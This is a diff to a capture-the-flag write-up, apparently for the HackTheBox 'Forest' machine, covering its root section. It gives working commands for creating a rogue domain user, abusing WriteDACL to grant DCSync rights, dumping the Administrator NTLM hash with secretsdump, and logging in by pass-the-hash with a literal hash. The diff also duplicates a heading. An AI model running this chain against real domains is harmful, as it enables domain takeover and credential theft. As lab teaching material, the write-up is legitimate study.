@@ -176,6 +176,20 @@ A PowerShell session is established as svc-alfresco. The user flag can now be re
 
 ## **Root**
 
+## **Root**
+
+BloodHound reveals that the **Exchange Windows Permissions** group has WriteDACL over the domain `htb.local`:
+
+![](/assets/img/forest/Pasted_image_20260930182923.png)
+
+The user `svc-alfresco` is a member of the **Account Operators** group:
+
+![](/assets/img/forest/Pasted_image_20260930183333.png)
+
+Account Operators has GenericAll over the **Exchange Windows Permissions** group — meaning we can add any user to it, inheriting its WriteDACL right on the domain:
+
+![](/assets/img/forest/Pasted_image_20260930183401.png)
+
 ### Overview - WriteDACL → DCSync Attack Chain
 
 **What is WriteDACL?** DACL (Discretionary Access Control List) defines which principals can access an object and what permissions they have in Active Directory. WriteDACL privilege allows modifying these permissions — meaning an attacker with WriteDACL on the domain object can grant themselves any AD right, including **DS-Replication-Get-Changes** and **DS-Replication-Get-Changes-All** (the rights required for DCSync).
@@ -194,6 +208,8 @@ A PowerShell session is established as svc-alfresco. The user flag can now be re
 
 From the evil-winrm session as svc-alfresco, we leverage Account Operators membership to create a new domain user. Account Operators can create users and add them to most groups except Domain Admins and Administrators:
 
+powershell
+
 ```powershell
 net user kali Password123@! /add /domain
 ```
@@ -201,6 +217,8 @@ net user kali Password123@! /add /domain
 ### Step 2: Add New User to Exchange Windows Permissions
 
 We add our new user to the Exchange Windows Permissions group, inheriting its WriteDACL right on the domain object:
+
+powershell
 
 ```powershell
 net group "Exchange Windows Permissions" kali /add /domain
@@ -212,6 +230,8 @@ net group "Exchange Windows Permissions" kali /add /domain
 
 We load PowerView into memory and create a credential object for our new user. Then we use `Add-DomainObjectAcl` to inject DCSync Access Control Entries (ACEs) onto the domain object — granting `kali` the DS-Replication rights needed for DCSync:
 
+powershell
+
 ```powershell
 Import-Module ./powerview.ps1
 $SecPassword = ConvertTo-SecureString 'Password123@!' -AsPlainText -Force
@@ -219,6 +239,8 @@ $Cred = New-Object System.Management.Automation.PSCredential('htb\kali', $SecPas
 ```
 
 The `Add-DomainObjectAcl` function modifies the domain object's DACL using `kali`'s credentials (which now have WriteDACL via Exchange Windows Permissions). The `-Rights DCSync` shorthand grants both `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`:
+
+powershell
 
 ```powershell
 Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity kali -Rights DCSync -Verbose
@@ -232,6 +254,8 @@ The ACEs are successfully added to the domain object.
 
 From our Linux attacker machine, we use `impacket-secretsdump` to perform the DCSync attack as `kali`. The `-just-dc-user Administrator` flag limits the dump to only the Administrator hash, reducing noise. The tool connects to the DC and replicates the Administrator's NTLM hash as if it were another domain controller:
 
+bash
+
 ```bash
 faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
 impacket-secretsdump htb.local/kali:'Password123@!'@<target> -just-dc-user Administrator
@@ -244,6 +268,8 @@ impacket-secretsdump htb.local/kali:'Password123@!'@<target> -just-dc-user Admin
 ### Step 5: Pass-the-Hash - Administrator Access
 
 We use the extracted NTLM hash to authenticate as Administrator via evil-winrm. The `-H` flag specifies the NT hash for pass-the-hash authentication — no plaintext password required:
+
+bash
 
 ```bash
 evil-winrm -i htb.local -u 'Administrator' -H 32693b11e6aa90eb43d32c72a07ceea6
